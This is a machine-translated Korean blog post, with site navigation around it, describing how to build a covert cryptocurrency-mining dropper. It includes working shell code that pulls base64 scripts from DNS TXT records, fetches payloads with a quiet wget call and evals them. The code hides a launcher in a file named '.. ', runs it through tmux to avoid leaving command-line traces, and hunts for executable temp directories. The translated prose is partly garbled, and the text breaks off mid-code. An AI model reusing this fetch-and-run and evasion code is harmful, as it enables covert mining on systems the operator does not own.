<!DOCTYPE html><HTML lang="ko"><head><meta charset="UTF-8"/><meta content="width=device-width, initial-scale=1" name="viewport"/><link href="https://www.unto.re/ko/posts/chronichles_of_a_cryptonote_dropper/" rel="canonical"/><link href="https://www.unto.re/amp/ko/posts/chronichles_of_a_cryptonote_dropper/" rel="amphtml"/><script class="" id="" type="application/ld+json">{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2021,"@context":"https://schema.org/","image":"/assets/appa.png","@type":"WebSite"}</script><script class="" id="" type="application/ld+json">{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2021-08-21","dateCreated":"August 21, 2021","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2021-08-21","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2021-08-21","inLanguage":"English","image":"/assets/appa.png","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script class="" id="ldj-breadcrumbs" type="application/ld+json">{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><link href="/libs/highlight/github.min.css" rel="stylesheet"/><link href="/css/franklin.css" rel="stylesheet"/><link href="/css/main.css" rel="stylesheet"/><link href="/css/menu.css" rel="stylesheet"/><link href="/css/pages.css" rel="stylesheet"/><link href="/css/lunr.css" rel="stylesheet"/><link href="/css/footer.css" rel="stylesheet"/><link href="/css/responsive.css" rel="stylesheet"/><link href="/css/animations.css" rel="stylesheet"/><link href="/css/docco.css" rel="stylesheet"/><link href="/css/flags-sprite.css" rel="stylesheet"/><link href="/assets/favicon.png" rel="icon" type="image/x-icon"/><link href="/assets/favicon.svg" rel="icon" type="image/svg+xml"/><title> 암호 화폐 드롭퍼의 연대기</title><meta content="...How far are you willing to go for...pennies?" name="description"/><script src="/libs/load.js"></script><script class="" id="" type="application/ld+json">{"url":"/ko/posts/chronichles_of_a_cryptonote_dropper/","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"mentions":null,"description":"","@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"","dateCreated":"","@id":"/ko/posts/chronichles_of_a_cryptonote_dropper/","dateModified":"","keywords":[],"creativeWorkStatus":"Published","translator":{"url":"http://google.translate.com","name":"Google Translate","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/"},"datePublished":"2021-10-19T19:08:30.970","inLanguage":"ko","name":"","mainEntityOfPage":{"@id":"/ko/posts/chronichles_of_a_cryptonote_dropper/","@type":"Article"}}</script></head><body class=""><div class="masthead"><div class="masthead__inner-wrap"><div class="masthead__menu"><a class="site-title" href="/ko/"></a><div class="author__wrap"><script class="" id="" type="application/ld+json">{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"}</script><ul><li class="author__avatar" onclick="toggleTheme()"><img alt=" 원더라이트" class="flip-front" src="/assets/appa.png"/></li><li class="author__urls social-icons"><a href="https://twitter.com/untoreh" rel="nofollow noopener noreferrer"><i aria-hidden="true" class="fab fa-fw fa-twitter-square"></i></a></li><li class="author__urls social-icons"><a href="https://github.com/untoreh" rel="nofollow noopener noreferrer"><i aria-hidden="true" class="fab fa-fw fa-github"></i></a></li><li class="author__urls social-icons"><a href="mailto:contact@unto.re"><i class="fas fa-envelope"></i></a></li><li><script class="" id="" type="application/ld+json">{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script></li></ul></div><nav id="site-nav"><div class="horiz"><ul><li class="masthead__menu-item hvr-outline-in" id="lunrSearch"><form id="lunrSearchForm" name="lunrSearchForm"><button class="search-button" formaction="/search/index.html" type="submit" value="Search"><i class="fas fa-search menu-icons"></i></button><input class="search-input" name="q" placeholder="Search…" type="text"/></form></li><li class="masthead__menu-item hvr-outline-in"><a href="/ko/posts/" title="All the articles that I have written"><i class="fas fa-pen menu-icons"></i> 게시물</a></li><li class="masthead__menu-item hvr-outline-in"><a href="/ko/media/" title="Video and audio content from streaming websites."><i class="fas fa-tv menu-icons"></i> 미디어</a></li><li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website&#39;s language"><button class="langs-dropdown-wrapper"><i class="fas fa-language menu-icons"></i> Lang
            <div class="langs-dropdown-content" id="langs-dropdown-menu"><ul id="lang-list"><a class="lang-link" href="/ar/posts/chronichles_of_a_cryptonote_dropper" id="lang-ar"><span class="flag flag-sa"></span>Arabic</a><a class="lang-link" href="/bn/posts/chronichles_of_a_cryptonote_dropper" id="lang-bn"><span class="flag flag-bd"></span>Bengali</a><a class="lang-link" href="/nl/posts/chronichles_of_a_cryptonote_dropper" id="lang-nl"><span class="flag flag-nl"></span>Dutch</a><a class="lang-link" href="/posts/chronichles_of_a_cryptonote_dropper" id="lang-en"><span class="flag flag-gb"></span>English</a><a class="lang-link" href="/tl/posts/chronichles_of_a_cryptonote_dropper" id="lang-tl"><span class="flag flag-ph"></span>Filipino</a><a class="lang-link" href="/fr/posts/chronichles_of_a_cryptonote_dropper" id="lang-fr"><span class="flag flag-fr"></span>French</a><a class="lang-link" href="/de/posts/chronichles_of_a_cryptonote_dropper" id="lang-de"><span class="flag flag-de"></span>German</a><a class="lang-link" href="/el/posts/chronichles_of_a_cryptonote_dropper" id="lang-el"><span class="flag flag-gr"></span>Greek</a><a class="lang-link" href="/hi/posts/chronichles_of_a_cryptonote_dropper" id="lang-hi"><span class="flag flag-in"></span>Hindi</a><a class="lang-link" href="/it/posts/chronichles_of_a_cryptonote_dropper" id="lang-it"><span class="flag flag-it"></span>Italian</a><a class="lang-link" href="/ja/posts/chronichles_of_a_cryptonote_dropper" id="lang-ja"><span class="flag flag-jp"></span>Japanese</a><a class="lang-link" href="/jw/posts/chronichles_of_a_cryptonote_dropper" id="lang-jw"><span class="flag flag-id"></span>Javanese</a><a class="lang-link" href="/ko/posts/chronichles_of_a_cryptonote_dropper" id="lang-ko"><span class="flag flag-kr"></span>Korean</a><a class="lang-link" href="/ms/posts/chronichles_of_a_cryptonote_dropper" id="lang-ms"><span class="flag flag-ms"></span>Malay</a><a class="lang-link" href="/zh/posts/chronichles_of_a_cryptonote_dropper" id="lang-zh"><span class="flag flag-cn"></span>Mandarin Chinese</a><a class="lang-link" href="/pl/posts/chronichles_of_a_cryptonote_dropper" id="lang-pl"><span class="flag flag-pl"></span>Polish</a><a class="lang-link" href="/pt/posts/chronichles_of_a_cryptonote_dropper" id="lang-pt"><span class="flag flag-pt"></span>Portuguese</a><a class="lang-link" href="/pa/posts/chronichles_of_a_cryptonote_dropper" id="lang-pa"><span class="flag flag-in"></span>Punjabi</a><a class="lang-link" href="/ro/posts/chronichles_of_a_cryptonote_dropper" id="lang-ro"><span class="flag flag-ro"></span>Romanian</a><a class="lang-link" href="/ru/posts/chronichles_of_a_cryptonote_dropper" id="lang-ru"><span class="flag flag-ru"></span>Russian</a><a class="lang-link" href="/es/posts/chronichles_of_a_cryptonote_dropper" id="lang-es"><span class="flag flag-es"></span>Spanish</a><a class="lang-link" href="/sv/posts/chronichles_of_a_cryptonote_dropper" id="lang-sv"><span class="flag flag-se"></span>Swedish</a><a class="lang-link" href="/th/posts/chronichles_of_a_cryptonote_dropper" id="lang-th"><span class="flag flag-th"></span>Thai</a><a class="lang-link" href="/tr/posts/chronichles_of_a_cryptonote_dropper" id="lang-tr"><span class="flag flag-tr"></span>Turkish</a><a class="lang-link" href="/uk/posts/chronichles_of_a_cryptonote_dropper" id="lang-uk"><span class="flag flag-ua"></span>Ukranian</a><a class="lang-link" href="/ur/posts/chronichles_of_a_cryptonote_dropper" id="lang-ur"><span class="flag flag-pk"></span>Urdu</a><a class="lang-link" href="/vi/posts/chronichles_of_a_cryptonote_dropper" id="lang-vi"><span class="flag flag-vn"></span>Vietnamese</a><a class="lang-link" href="/zu/posts/chronichles_of_a_cryptonote_dropper" id="lang-zu"><span class="flag flag-za"></span>Zulu</a></ul></div></button></li></ul></div><button class="ham"><i class="fas fa-bars ham-icon"></i></button><div class="vert"><ul><li class="masthead__menu-item hvr-outline-in" id="lunrSearch"><form id="lunrSearchForm" name="lunrSearchForm"><button class="search-button" formaction="/search/index.html" type="submit" value="Search"><i class="fas fa-search menu-icons"></i></button><input class="search-input" name="q" placeholder="Search…" type="text"/></form></li><li class="masthead__menu-item hvr-outline-in"><a href="/ko/posts/" title="All the articles that I have written"><i class="fas fa-pen menu-icons"></i> 게시물</a></li><li class="masthead__menu-item hvr-outline-in"><a href="/ko/media/" title="Video and audio content from streaming websites."><i class="fas fa-tv menu-icons"></i> 미디어</a></li><li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website&#39;s language"><button class="langs-dropdown-wrapper"><i class="fas fa-language menu-icons"></i> Lang
            <div class="langs-dropdown-content" id="langs-dropdown-menu"><ul id="lang-list"><a class="lang-link" href="/ar/posts/chronichles_of_a_cryptonote_dropper" id="lang-ar"><span class="flag flag-sa"></span>Arabic</a><a class="lang-link" href="/bn/posts/chronichles_of_a_cryptonote_dropper" id="lang-bn"><span class="flag flag-bd"></span>Bengali</a><a class="lang-link" href="/nl/posts/chronichles_of_a_cryptonote_dropper" id="lang-nl"><span class="flag flag-nl"></span>Dutch</a><a class="lang-link" href="/posts/chronichles_of_a_cryptonote_dropper" id="lang-en"><span class="flag flag-gb"></span>English</a><a class="lang-link" href="/tl/posts/chronichles_of_a_cryptonote_dropper" id="lang-tl"><span class="flag flag-ph"></span>Filipino</a><a class="lang-link" href="/fr/posts/chronichles_of_a_cryptonote_dropper" id="lang-fr"><span class="flag flag-fr"></span>French</a><a class="lang-link" href="/de/posts/chronichles_of_a_cryptonote_dropper" id="lang-de"><span class="flag flag-de"></span>German</a><a class="lang-link" href="/el/posts/chronichles_of_a_cryptonote_dropper" id="lang-el"><span class="flag flag-gr"></span>Greek</a><a class="lang-link" href="/hi/posts/chronichles_of_a_cryptonote_dropper" id="lang-hi"><span class="flag flag-in"></span>Hindi</a><a class="lang-link" href="/it/posts/chronichles_of_a_cryptonote_dropper" id="lang-it"><span class="flag flag-it"></span>Italian</a><a class="lang-link" href="/ja/posts/chronichles_of_a_cryptonote_dropper" id="lang-ja"><span class="flag flag-jp"></span>Japanese</a><a class="lang-link" href="/jw/posts/chronichles_of_a_cryptonote_dropper" id="lang-jw"><span class="flag flag-id"></span>Javanese</a><a class="lang-link" href="/ko/posts/chronichles_of_a_cryptonote_dropper" id="lang-ko"><span class="flag flag-kr"></span>Korean</a><a class="lang-link" href="/ms/posts/chronichles_of_a_cryptonote_dropper" id="lang-ms"><span class="flag flag-ms"></span>Malay</a><a class="lang-link" href="/zh/posts/chronichles_of_a_cryptonote_dropper" id="lang-zh"><span class="flag flag-cn"></span>Mandarin Chinese</a><a class="lang-link" href="/pl/posts/chronichles_of_a_cryptonote_dropper" id="lang-pl"><span class="flag flag-pl"></span>Polish</a><a class="lang-link" href="/pt/posts/chronichles_of_a_cryptonote_dropper" id="lang-pt"><span class="flag flag-pt"></span>Portuguese</a><a class="lang-link" href="/pa/posts/chronichles_of_a_cryptonote_dropper" id="lang-pa"><span class="flag flag-in"></span>Punjabi</a><a class="lang-link" href="/ro/posts/chronichles_of_a_cryptonote_dropper" id="lang-ro"><span class="flag flag-ro"></span>Romanian</a><a class="lang-link" href="/ru/posts/chronichles_of_a_cryptonote_dropper" id="lang-ru"><span class="flag flag-ru"></span>Russian</a><a class="lang-link" href="/es/posts/chronichles_of_a_cryptonote_dropper" id="lang-es"><span class="flag flag-es"></span>Spanish</a><a class="lang-link" href="/sv/posts/chronichles_of_a_cryptonote_dropper" id="lang-sv"><span class="flag flag-se"></span>Swedish</a><a class="lang-link" href="/th/posts/chronichles_of_a_cryptonote_dropper" id="lang-th"><span class="flag flag-th"></span>Thai</a><a class="lang-link" href="/tr/posts/chronichles_of_a_cryptonote_dropper" id="lang-tr"><span class="flag flag-tr"></span>Turkish</a><a class="lang-link" href="/uk/posts/chronichles_of_a_cryptonote_dropper" id="lang-uk"><span class="flag flag-ua"></span>Ukranian</a><a class="lang-link" href="/ur/posts/chronichles_of_a_cryptonote_dropper" id="lang-ur"><span class="flag flag-pk"></span>Urdu</a><a class="lang-link" href="/vi/posts/chronichles_of_a_cryptonote_dropper" id="lang-vi"><span class="flag flag-vn"></span>Vietnamese</a><a class="lang-link" href="/zu/posts/chronichles_of_a_cryptonote_dropper" id="lang-zu"><span class="flag flag-za"></span>Zulu</a></ul></div></button></li></ul></div></nav></div></div></div><div><h1 id="title"><a href="/ko/posts/chronichles_of_a_cryptonote_dropper"> 암호 화폐 드롭퍼의 연대기</a></h1><blockquote id="page-description" style="font-style: italic;"> 
                ...얼마나 ... 페니를 위해 갈 의향이 있습니까?
            </blockquote></div><div class="franklin-content"><p> 당신이 광산을 원한다고 가정<a href="https://en.wikipedia.org/wiki/Cryptocurrency"> 암호화폐</a>  원격에서<em> 가상</em>  하드웨어. 당신은 내 것을 찾을 필요가 있습니다. 원격 서버는 다음을 의미합니다.<a href="https://en.wikipedia.org/wiki/Application-specific_integrated_circuit"> 아식스</a>  또는 GPU 작업 증명 알고리즘, 기본적으로만<a href="\posts/a-few-notes-on-proof-of-work"> CPU 친화적인 코인</a>.</p><h2 id="the_software"><a class="header-anchor" href="#the_software"> 소프트웨어</a></h2><p> 검색 및 찾기<a href="https://github.com/xmrig/xmrig"> 갱부</a> , 하지만 실제로 좋지는 않습니다. 원격에서 더 잘 제어할 수 있는 것을 원하므로 찾을 수 있습니다.<a href="https://github.com/Bendr0id/xmrigCC"> 다른 광부</a> . 당신은 또한 원한다<a href="https://github.com/Bendr0id/xmrigcc-proxy"> 대리</a> , 많은 연결이 수명이 짧기 때문에<a href="https://en.wikipedia.org/wiki/Denial-of-service_attack"> 도스</a>  당신의 마이닝 풀. 또한<a href="https://github.com/search?q=tunnel"> 터널</a>  좋은 것.</p><h2 id="the_design"><a class="header-anchor" href="#the_design"> 디자인</a></h2><p> 일부 봇넷은 블록체인 데이터를 사용하여 명령을 조회하고,<a href="https://twitter.com/sarahjamielewis"> 어떤 사람</a>  도 있는 것으로 보입니다<a href="https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968"> 잃어버린 내기</a>  다시는 이런 일이 일어나지 않을 것입니다...어쨌든 우리는 그렇게 정교하지 않습니다. 임시 디렉토리에서 자체 추출이 실행되고 떠나는 페이로드를 가져오는 스크립트를 저장하는 일부 DNS 레코드를 사용하면 됩니다.<em> 거의</em>  설정의 흔적이 없습니다. 다음은 구조를 나타내는 작은 순서도입니다.</p><img alt="" src="/assets/posts/output/payload.png"/><h2 id="launcher"><a class="header-anchor" href="#launcher">발사통</a></h2><p> 시작 스크립트의 요점은 시간의 테스트를 견딜 수 있도록 액세스하고 쉽게 업데이트할 수 있다는 것입니다. 업데이트 중<a href="https://en.wikipedia.org/wiki/Domain_Name_System"> DNS</a>  기록은 쉽고 DNS는 네트워크 내에서 마지막으로 종료되는 것입니다. 왜냐하면 IP 주소는 기억하기 어렵기 때문입니다...그래서 대부분의 시간을 사용할 수 있을 것입니다. 우리가 언제인지 알잖아<em> 배포 스크립트 가져오기</em>우리는 실제로 이미 일부 로직을 실행하고 있습니다. 이것은 런처 스크립트입니다. 레코드를 조회하기 위해 DNS 쿼리를 수행하는 기능이 필요합니다. DNS는 어디에나 있을 수 있지만<a href="https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/"> 파기</a>  아니다.</p><p> 다른 도구를 다운로드해야 하는 경우 여기에 약간의 수수께끼가 있습니다.<em> 페이로드를 다운로드하기 위해 다른 스크립트를 다운로드하려면</em>  페이로드를 다운로드하기만 하면 됩니다! 방어에서...이 스크립트 댄스를 수행하면 난독화에 추가되고 런처(유지 관리 가능성, 예)의 구현을 하나만 유지할 수 있으며 대부분의 경우 필요하지 않습니다.<a href="https://en.wikipedia.org/wiki/Standalone_program"> 정적으로 연결된</a>  자체 호스팅 또는 클라우드 호스팅에서 가져온 dns 쿼리를 수행하기 위해 실행 가능한 dig 실행 비우호적이며 의도적으로 그렇습니다).</p><p> DNS 레코드에 무엇이 있습니까? 우리는 사용하고 있습니다<a href="https://en.wikipedia.org/wiki/TXT_record"> TXT</a>  사용자 지정 도메인의 레코드(여기서도 대체). 왜 TXT인가? 그들은 가장 많은 양의 데이터를 저장할 수 있습니다. 일반적으로 일종의<a href="https://www.ietf.org/rfc/rfc6763.txt"> 추천</a>  에 따라<em> 것들</em> . 우리는 구체적으로 사용하고 있습니다<a href="https://www.cloudflare.com/"> 클라우드 플레어</a>  무료이고 거의 유일한 플레이어이기 때문에 DNS 조작을 위해 (<em> 잘은 아니지만 다른 대안은 현명하게 기능을 약화시킵니다.</em> ). 여러 데이터 조각을 저장할 수 있습니다.<em> 같은</em>  기록...이것은 혼란스러워지기 시작하고 일부 사양에 대해 뒤섞이기 시작합니다...(접선) Cloudflare<a href="https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size"> 사용</a>  허용하다<em> 사슬로 묶인</em>TXT 레코드는 총 ~9k 바이트이고, 문서는 이제 ~2k 바이트를 나타냅니다. 변경 이전에는 ~6k를 사용하고 있었고 압축되지 않은 스크립트를 제공하고 있었습니다. 그 후에는 스크립트를 축소하고 미리 압축해야 했습니다(사실 저는 사용을 시도했다<a href="https://freedns.afraid.org/"> 해방</a>  공급자, 나는 그들이 엄격한 무지방 TXT 레코드 정책을 가지고 있다고 추측하여 하루 만에 금지되었지만 gzip 압축은 파이프 친화적이지 않은 것으로 보이며 여전히 문제를 일으키고 있었기 때문에 압축 없이 스크립트를 밀어 넣어야 했습니다( 끝 접선).</p><p> 어떻게 보관합니까? TXT 레코드는 영숫자 문자열만 지원합니다.<a href="https://en.wikipedia.org/wiki/Null_character"> NUL</a> , 그래서 우리는 그것을 null이 아닌 인코딩으로 감싸야 합니다.<a href="https://en.wikipedia.org/wiki/Base64"> 베이스64</a>  이 제약 조건을 충족하고 저장하기 때문에<em> 사슬로 묶인</em>  TXT 레코드, 우리는 쉘 재료를 사용하기 때문에 출력을 청크해야 합니다. 이것은 다음을 통해 수행됩니다.<code>-w</code>  flag, busybox에서 성가신 이전 버전에서는 이러한 플래그가 없었습니다(또는 옵트인). 대안은 openssl과 함께 번들로 제공되는 인코더를 사용하는 것입니다.<code>openssl enc -base64</code>.</p><p> 이제 배포 스크립트를 저장하는 방법을 알았으므로 다음 중 하나를 사용하여 저장합니다.<a href="https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md"> cf cli</a>  또는 수동으로. 어떻게 당기나요? 우리는 bindutils 또는 우리 자신의 것이 필요하다고 언급했습니다.<code>dig</code> ... 제공 엔드포인트를 선택한 후 다운로드하려고 합니다. 일반적으로 사용 가능한 것은<a href="https://www.gnu.org/software/wget/"> wget</a>  또는<a href="https://curl.se/"> 곱슬 곱슬하다</a> , wget은 훨씬 더 자주 사전 설치된 것으로 발견되지만 busybox는 동적 라이브러리와 함께 tls 지원만 제공하므로 엔드포인트가 http를 제공하거나 유틸리티가 다음과 같은지 확인해야 합니다.<code>wget</code>  gnu-utils에서</p><pre><code class="bash hljs"><span class="hljs-comment"># the wget command</span>
wget -t 2 -T 10 -q -i- -O- &gt; <span class="hljs-variable">$filename</span> &lt;&lt;&lt; <span class="hljs-string">"<span class="hljs-variable">$digurl</span>"</span></code></pre><p> 시도를 의미합니다<code>-t2</code>  기다리는 시간<code>-T10</code>  초<code>-q</code>  조용히 읽기<code>-i-</code>  표준 입력(<code>$digurl</code> ) 및 쓰기<code>-O-</code>  표준 출력(<code>$filename</code>). 이 명령은 언뜻보기에 다운로드하는 내용을 나타내지 않습니다. 같은 이유로 다른 셸 명령에 대해 매우 주의하거나 셸(<a href="https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29"> 세게 때리다</a> ) 가능한 경우 내장. 또한 실행 파일을 다운로드하는 위치에 주의하고 실행 가능한지 확인해야 합니다. 특히 컨테이너 및<code>tmp</code>  경로는<code>noexec</code> . 이제 DNS 쿼리 도구가 있으므로 레코드를 가져옵니다.</p><pre><code class="bash hljs">dig txt <span class="hljs-variable">${record}</span>.<span class="hljs-variable">${zone}</span> +short +tcp +timeout=3 +retries=0 <span class="hljs-variable">$dnsserver</span></code></pre><p> 플래그는 여기에서 자명합니다.<code>+short</code>  단지 데이터 자체에만 관심이 있다는 것을 의미하므로 출력을 구문 분석할 필요가 없습니다. google(<code>8.8.8.8</code> ) 또는 클라우드플레어(<code>1.1.1.1</code> ) 많은 환경이 기본적으로 자체 DNS 서버로 DNS 쿼리를 리디렉션하거나 프록시하기 때문입니다. 청크된 스크립트를 가져온 후 디코딩 준비를 위해 따옴표와 공백을 처리합니다.</p><pre><code class="bash hljs">data=<span class="hljs-variable">${data//\"}</span><span class="hljs-comment"># remove quotes</span>
data=<span class="hljs-variable">${data// }</span><span class="hljs-comment"># remove whitespace</span><span class="hljs-built_in">declare</span> -a ar_data
<span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span><span class="hljs-variable">$data</span>; <span class="hljs-keyword">do</span>
    ar_data[<span class="hljs-variable">${l:0:1}</span>]=<span class="hljs-variable">${l:1}</span><span class="hljs-comment"># iterate over each line and remove the first characther</span><span class="hljs-keyword">done</span>
data=<span class="hljs-variable">${ar_data[@]}</span><span class="hljs-comment"># join all the lines</span>
data=<span class="hljs-variable">${data// }</span><span class="hljs-comment"># ensure joining didn't add whitespace</span><span class="hljs-comment"># decode</span>
launcher=$(<span class="hljs-built_in">echo</span><span class="hljs-string">"<span class="hljs-variable">$launcher</span>"</span> | <span class="hljs-variable">$b64</span> -d -w <span class="hljs-variable">$chunksize</span>)</code></pre><p> 만약 지금 우리가<em> 아직</em>  런처가 없나요? DNS가 지저분합니다. 대체를 원합니다. 실행기 스크립트를 직접 가져오도록 하위 도메인을 설정할 수 있습니다. 스크립트를 평가하기 전에 일부 변수를 사용하여 스크립트를 사용자 지정하고 싶습니다. 다시 TXT 레코드를 사용하여 NAME=VALUE 변수 목록을 저장하고 구문 분석할 수 있습니다. 변수에 대한 대체도 있습니다. cloudflare는 URL을 기반으로 리디렉션을 제공하며 이러한 리디렉션이 제공됩니다.<em> ~ 전에</em>  대상이므로 끝점이 필요하지 않습니다. 정규식 기반 리디렉션 규칙을 가상의 끝점으로 구성하기만 하면 됩니다. 관심 있는 것은 URL의 매개변수입니다.<code>?NAME=VALUE&amp;NAME2=VALUE2...</code>, 항상 인용 코드와 이스케이프 코드에 주의하면서 리디렉션 URL을 변경하여 런처를 매개변수화할 수 있습니다.</p><pre><code class="bash hljs"><span class="hljs-comment">## m1 also important to stop wget</span>
pl_vars=$(<span class="hljs-built_in">echo</span><span class="hljs-string">"<span class="hljs-variable">$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2&gt;&amp;1 | grep -m1 <span class="hljs-string">'Location'</span>)
pl_vars=<span class="hljs-variable">${pl_vars#*\/}</span>
pl_vars=<span class="hljs-variable">${pl_vars//\"&amp;/\" }</span>
pl_vars=<span class="hljs-variable">${pl_vars//%3F/\?}</span></code></pre><p> wget<code>-S</code>  구문 분석에 관심이 있는 리디렉션 URL을 인쇄합니다. 매개변수와 스크립트가 있으면 파일에 작성하는 변수를 평가합니다.</p><pre><code class="bash hljs"><span class="hljs-built_in">eval</span><span class="hljs-string">"<span class="hljs-variable">$pl_vars</span>"</span><span class="hljs-built_in">echo</span><span class="hljs-string">"export \
<span class="hljs-variable">$pl_vars</span> \
<span class="hljs-variable">$ENV_VARS</span> \
"</span>&gt;env.sh</code></pre><p> 이 파일의 출처는 are deploy 스크립트입니다. 시작 스크립트의 마지막 부분은 실제<a href="https://en.wikipedia.org/wiki/Trampoline_(computing)"> 트램폴린</a> , 현재 쉘 프로세스 내에서 스크립트를 평가하거나 가능한 경우 tmux에서 관리하도록 할 수 있습니다.</p><pre><code class="bash hljs"><span class="hljs-comment"># printf preserves quotes</span><span class="hljs-built_in">eval</span><span class="hljs-string">"<span class="hljs-subst">$(printf '%s' <span class="hljs-string">"<span class="hljs-variable">$launcher</span>"</span>)</span>"</span> &amp;&gt;/dev/null
<span class="hljs-comment"># or tmux</span><span class="hljs-built_in">echo</span><span class="hljs-string">"<span class="hljs-variable">$launcher</span>"</span> &gt; <span class="hljs-string">".. "</span>
tmux send-keys -t miner <span class="hljs-string">". ./\".. \""</span> Enter</code></pre><p> 런처 스크립트는 ".."라는 이름의 파일에 덤프됩니다.<em> 부모의</em>  예배 규칙서. 그리고 세션 명령은 프로세스 명령에 남아 있기 때문에 포함하지 않고 대신 미리 tmux 세션을 시작하고 tmux 터미널 인터페이스를 통해 소스 명령을 보냅니다. 이와 관련하여 때때로 다음을 사용하여 실행 파일을 호출합니다.<code>./</code>  해당 문자를 명령에 유지하므로 다음을 추가하는 것이 좋습니다.<code>$PWD</code>  길로..<code>PATH=$PWD:$PATH</code>.</p><h2 id="the_payload"><a class="header-anchor" href="#the_payload"> 페이로드</a></h2><p> 배포 스크립트는 소싱으로 시작합니다.<code>env.sh</code>  파일 및 vars를 다음과 같이 유지하거나 구성<code>STARTING_*</code>  같은 변수</p><pre><code class="bash hljs">STARTING_PATH=<span class="hljs-variable">${STARTING_PATH:-<span class="hljs-variable">$PATH</span>}</span>
STARTING_PID=<span class="hljs-variable">$BASHPID</span></code></pre><p> 이를 통해 환경을 재설정하는 동안 실행 중인 인스턴스를 종료하고 다시 시작할 수 있습니다. exec 기능이 있는 tmp 디렉토리로 전환할 수 있습니다.</p><pre><code class="bash hljs"><span class="hljs-comment"># out local subdirectory</span>
pathname=$(<span class="hljs-built_in">printf</span><span class="hljs-string">".%-<span class="hljs-subst">$((RANDOM%9+1)</span>)s"</span><span class="hljs-keyword">for</span> ph <span class="hljs-keyword">in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.<span class="hljs-built_in">local</span>,~/.cache,~/}; <span class="hljs-keyword">do</span>
    rm -rf <span class="hljs-string">"<span class="hljs-variable">$ph</span>/<span class="hljs-variable">$pathname</span>"</span> &amp;&amp;
        mkdir -p <span class="hljs-string">"<span class="hljs-variable">$ph</span>/<span class="hljs-variable">$pathname</span>"</span> &amp;&amp;
        tmppath=<span class="hljs-string">"<span class="hljs-variable">$ph</span>/<span class="hljs-variable">$pathname</span>"</span> &amp;&amp;
        is_path_executable <span class="hljs-string">"<span class="hljs-variable">$tmppath</span>"</span> &amp;&amp;
        <span class="hljs-built_in">export</span> PATH=<span class="hljs-string">"<span class="hljs-variable">${ph}</span>/<span class="hljs-variable">$pathname</span>:<span class="hljs-variable">${PATH}</span>"</span> tmppath &amp;&amp;
        <span class="hljs-built_in">break</span><span class="hljs-keyword">done</span>
[ -n <span class="hljs-string">"<span class="hljs-variable">$tmppath</span>"</span> ] &amp;&amp; <span class="hljs-built_in">cd</span><span class="hljs-string">"<span class="hljs-variable">$tmppath</span>"</span></code></pre><p> 이내인지 확인<a href="https://en.wikipedia.org/wiki/OS-level_virtualization"> 컨테이너</a>  또한 유용합니다. 힌트를 찾기 위해 파일 시스템을 조사할 수 있습니다.</p><pre><code class="bash hljs">c=$(<span class="hljs-built_in">builtin</span> compgen -G <span class="hljs-string">'/etc/cpa*'</span>)
